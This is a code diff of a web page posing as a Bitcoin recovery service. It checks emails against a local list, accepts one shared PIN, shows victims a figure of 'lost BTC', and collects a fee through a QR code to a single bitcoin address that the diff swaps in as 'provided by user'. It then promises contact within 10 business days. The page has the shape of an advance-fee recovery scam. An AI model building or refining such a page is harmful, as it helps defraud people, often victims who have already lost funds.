@@ -8,7 +8,6 @@
     </script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js">
     </script>
-    <!-- Load local email database -->
     <script src="emails.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
@@ -48,13 +47,8 @@
             animation: pulse 2s infinite;
         }
         @keyframes pulse {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.6;
-            }
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
         #status-message {
             min-height: 2.5rem;
@@ -66,22 +60,10 @@
             background: #f1f5f9;
             color: #0f172a;
         }
-        #status-message.success {
-            background: #dcfce7;
-            color: #166534;
-        }
-        #status-message.error {
-            background: #fee2e2;
-            color: #991b1b;
-        }
-        #status-message.info {
-            background: #dbeafe;
-            color: #1e40af;
-        }
-        #status-message.warning {
-            background: #fef3c7;
-            color: #92400e;
-        }
+        #status-message.success { background: #dcfce7; color: #166534; }
+        #status-message.error { background: #fee2e2; color: #991b1b; }
+        #status-message.info { background: #dbeafe; color: #1e40af; }
+        #status-message.warning { background: #fef3c7; color: #92400e; }
     </style>
 </head>
 <body>
@@ -203,15 +185,18 @@
         // CONFIGURATION (local)
         // ================================================================
 
-        // Fee addresses (replace with your own)
-        const FEE_ADDRESS_OPTION1 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
-        const FEE_ADDRESS_OPTION2 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+        // === FEE ADDRESS (provided by user) ===
+        const FEE_ADDRESS = 'bc1q304clunc0e8e4nvs35cdsk2fj062n62w6wga6g';
 
+        // Fee amounts for each option
         const FEE_AMOUNT_OPTION1 = 0.0019;
         const FEE_AMOUNT_OPTION2 = 0.0058;
 
         // CoinGecko API for current BTC price
         const PRICE_API = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd';
+
+        // Default PIN (all emails use the same PIN)
+        const DEFAULT_PIN = '1234';
 
         // ================================================================
 
@@ -256,7 +241,7 @@
                 return;
             }
 
-            // Normalize: all emails in validEmails are already lowercased? We'll check case-insensitively.
+            // Case-insensitive search
             const found = validEmails.some(e => e.toLowerCase() === email);
             if (!found) {
                 setStatus('❌ Email not found in the recovery list.', 'error');
@@ -264,7 +249,7 @@
                 return;
             }
 
-            // Check PIN (using default PIN for all)
+            // Check PIN
             if (pin !== DEFAULT_PIN) {
                 setStatus('❌ Incorrect PIN. Try again.', 'error');
                 resetLoginButton();
@@ -276,7 +261,6 @@
             setStatus('✅ Login successful! Fetching current BTC price...', 'info');
 
             try {
-                // Fetch current BTC price
                 const priceRes = await fetch(PRICE_API);
                 const priceData = await priceRes.json();
                 currentPrice = priceData.bitcoin.usd || 0;
@@ -298,7 +282,6 @@
             document.getElementById('display-lost-btc').innerText = lostBTC.toFixed(4) + ' BTC';
             document.getElementById('display-lost-usd').innerText = '$' + lostUSD.toFixed(2);
 
-            // Current value
             const currentValue = lostBTC * currentPrice;
             document.getElementById('display-current-price').innerText = '$' + currentPrice.toFixed(2);
             document.getElementById('display-current-value').innerText = '$' + currentValue.toFixed(2);
@@ -324,23 +307,16 @@
             const detailsDiv = document.getElementById('payment-details');
             detailsDiv.classList.remove('hidden-section');
 
-            // Determine fee and address
-            let feeAmount, feeAddress;
-            if (opt === '1') {
-                feeAmount = FEE_AMOUNT_OPTION1;
-                feeAddress = FEE_ADDRESS_OPTION1;
-            } else {
-                feeAmount = FEE_AMOUNT_OPTION2;
-                feeAddress = FEE_ADDRESS_OPTION2;
-            }
+            // Determine fee amount
+            let feeAmount = (opt === '1') ? FEE_AMOUNT_OPTION1 : FEE_AMOUNT_OPTION2;
 
-            // Update address
-            document.getElementById('fee-address').innerText = feeAddress;
+            // Update address display (same for both)
+            document.getElementById('fee-address').innerText = FEE_ADDRESS;
 
-            // Generate QR code
+            // Generate QR code with the exact amount
             const qrContainer = document.getElementById('qr-container');
             qrContainer.innerHTML = ''; // clear previous
-            const qrText = `bitcoin:${feeAddress}?amount=${feeAmount.toFixed(8)}`;
+            const qrText = `bitcoin:${FEE_ADDRESS}?amount=${feeAmount.toFixed(8)}`;
             new QRCode(qrContainer, {
                 text: qrText,
                 width: 200,
@@ -359,7 +335,6 @@
                 alert('Please select a recovery option first.');
                 return;
             }
-            // Hide recovery options and show final success
             document.getElementById('recovery-options').classList.add('hidden-section');
             document.getElementById('final-success').classList.remove('hidden-section');
             setStatus('✅ Recovery initiated. You will be contacted within 10 business days.', 'success');
